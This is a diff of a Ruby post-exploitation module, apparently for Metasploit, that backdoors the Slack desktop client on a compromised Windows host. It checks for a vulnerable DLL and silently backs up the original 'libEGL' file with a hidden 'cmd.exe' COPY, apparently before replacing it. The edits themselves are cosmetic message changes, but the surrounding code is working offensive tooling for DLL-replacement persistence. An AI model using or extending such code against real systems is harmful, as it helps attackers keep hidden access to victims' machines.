@@ -175,6 +175,7 @@ def ls_stage1
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found!")
       # backup original dll
+      print_good(" Backup original slack dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
@@ -210,8 +211,8 @@ def ls_stage1
       r.close
 
     else
-      print_error("ABORT: post-module cant find backdoor agent path...")
-      print_error("BACKDOOR_AGENT: #{d_path}\\#{p_name}")
+      print_error("ABORT: post-module cant find original dll...")
+      print_error("original dll: #{d_path}\\#{p_name}")
       print_line("")
     end
 
